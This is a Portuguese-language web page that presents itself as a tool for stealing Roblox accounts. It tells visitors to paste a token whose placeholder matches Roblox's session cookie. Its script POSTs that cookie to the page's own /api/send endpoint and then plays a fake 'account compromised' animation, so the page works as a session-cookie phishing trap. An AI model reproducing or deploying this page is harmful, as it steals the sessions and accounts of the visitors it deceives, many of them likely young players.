<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox Accounts Steal by Nukaa</title>
  <style>
    body { background: linear-gradient(135deg, #000000, #1a1a1a); color: #e0e0e0; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes pulseGlow { from { text-shadow: 0 0 15px rgba(255,255,255,0.6); } to { text-shadow: 0 0 30px rgba(255,255,255,0.9), 0 0 50px rgba(255,255,255,0.4); } }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,255,255,0.2); } 50% { box-shadow: 0 0 0 20px rgba(255,255,255,0); } }

    .container { display: flex; flex-direction: row; min-height: 100vh; background: #000000; animation: fadeIn 1.2s ease-out forwards; }
    .video-sidebar { width: 35%; min-width: 320px; background: #000000; display: flex; flex-direction: column; align-items: center; padding: 20px 10px; opacity: 0; animation: fadeIn 1.4s ease-out 0.3s forwards; }
    .video-wrapper { width: 100%; max-width: 380px; aspect-ratio: 16/9; background: #111111; border-radius: 12px; overflow: hidden; box-shadow: 0 0 15px rgba(255,255,255,0.08); transition: all 0.6s ease; }
    .video-sidebar:hover .video-wrapper { transform: scale(1.04); box-shadow: 0 0 25px rgba(255,255,255,0.15); }
    .video-label { margin-top: 12px; font-size: 1.3em; color: #cccccc; text-shadow: 0 0 8px rgba(255,255,255,0.4); font-weight: bold; text-align: center; }
    #main-content { flex: 1; padding: 60px 40px; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; opacity: 0; animation: fadeIn 1.3s ease-out 0.5s forwards; }
    h1 { color: #ffffff; font-size: 3.2em; margin-bottom: 15px; animation: pulseGlow 6s ease-in-out infinite alternate; }
    .subtitle { color: #dddddd; font-size: 1.6em; margin-bottom: 30px; font-weight: bold; }
    input { width: 90%; max-width: 550px; padding: 18px; font-size: 20px; border: 2px solid #444444; border-radius: 12px; background: #111111; color: #eeeeee; margin-bottom: 20px; box-shadow: inset 0 0 10px #000000; transition: all 0.4s ease; }
    input:focus { border-color: #ffffff; box-shadow: 0 0 15px rgba(255,255,255,0.4), inset 0 0 10px #000000; outline: none; }
    button { padding: 18px 80px; font-size: 22px; background: #222222; color: white; border: 2px solid #ffffff; border-radius: 12px; cursor: pointer; font-weight: bold; box-shadow: 0 0 10px #ffffff, 0 0 20px #ffffff, 0 0 30px rgba(255,255,255,0.6); transition: all 0.4s ease; }
    button:hover { background: #333333; transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.5), 0 0 25px #ffffff, 0 0 50px #ffffff, 0 0 70px rgba(255,255,255,0.7); }
    #status { margin-top: 30px; font-size: 20px; font-weight: bold; transition: color 0.5s ease; }
    #loading { display: none; position: fixed; inset: 0; background: #000000; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transition: opacity 0.6s ease; }
    #loading.show { opacity: 1; display: flex; }
    .spinner { width: 100px; height: 100px; border: 12px solid #444444; border-top: 12px solid #ffffff; border-radius: 50%; animation: spin 1.3s linear infinite, pulse 2.5s ease-in-out infinite; margin-bottom: 50px; }
    #loading-text { font-size: 2.6em; color: #dddddd; text-shadow: 0 0 15px rgba(255,255,255,0.5); animation: fadeIn 1s ease-out; }

    @media (max-width: 900px) {
      .container { flex-direction: column; }
      .video-sidebar { width: 100%; padding: 15px 10px; }
      .video-wrapper { max-width: 90%; height: 180px; }
      #main-content { padding: 40px 20px; }
      #video-right { order: 2; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="video-sidebar" id="video-left">
      <div class="video-wrapper">
        <iframe src="https://www.youtube.com/embed/FHjCtdGNHCU?rel=0&modestbranding=1&showinfo=0" title="Tutorial PC" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
      </div>
      <div class="video-label">Tutorial pra PC</div>
    </div>

    <div id="main-content">
      <h1 class="glow">Roblox Accounts Steal by Nukaa</h1>
      <p class="subtitle">Insira o token aqui</p>
      <input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
      <br>
      <button id="sendBtn">Enviar token</button>
      <div id="status"></div>
    </div>

    <div class="video-sidebar" id="video-right">
      <div class="video-wrapper">
        <iframe src="https://www.youtube.com/embed/nwHMDsXw8WE?rel=0&modestbranding=1&showinfo=0" title="Tutorial Mobile" frameborder="0" allow="accelerometer; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
      </div>
      <div class="video-label">Tutorial pro Mobile</div>
    </div>
  </div>

  <div id="loading">
    <div class="spinner"></div>
    <div id="loading-text">Acessando conta...</div>
  </div>

  <script>
    const messages = [
      "Acessando conta...", "Verificando autenticação...", "Decodificando token...",
      "Descobrindo senha...", "Localizando itens...", "Acessando histórico...",
      "Limpando vestígios...", "Bypassando proteções...", "Finalizando acesso total...",
      "Conta completamente comprometida..."
    ];

    let msgIndex = 0;
    let interval;

    function showLoading() {
      document.querySelector('.container').style.display = "none";
      const loading = document.getElementById("loading");
      loading.style.display = "flex";
      setTimeout(() => loading.classList.add("show"), 10);

      const textEl = document.getElementById("loading-text");
      interval = setInterval(() => {
        textEl.innerText = messages[msgIndex];
        msgIndex = (msgIndex + 1) % messages.length;
      }, 2800);
    }

    async function enviar() {
      const token = document.getElementById("token").value.trim();
      const status = document.getElementById("status");
      const btn = document.getElementById("sendBtn");

      if (token.length < 30) {
        status.innerHTML = "Token curto demais. Cola o correto.";
        status.style.color = "#ff6666";
        return;
      }

      status.innerHTML = "Enviando token...";
      status.style.color = "#ffff66";
      btn.disabled = true;
      btn.innerText = "Enviando...";

      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token })
        });

        if (response.ok) {
          status.innerHTML = "";
          showLoading();
        } else {
          throw new Error('Falha');
        }
      } catch (err) {
        status.innerHTML = "Falha ao enviar. Tente novamente.";
        status.style.color = "#ff6666";
        btn.disabled = false;
        btn.innerText = "Enviar token";
      }
    }

    // Evento do botão
    document.getElementById("sendBtn").addEventListener("click", enviar);
  </script>
</body>
</html>
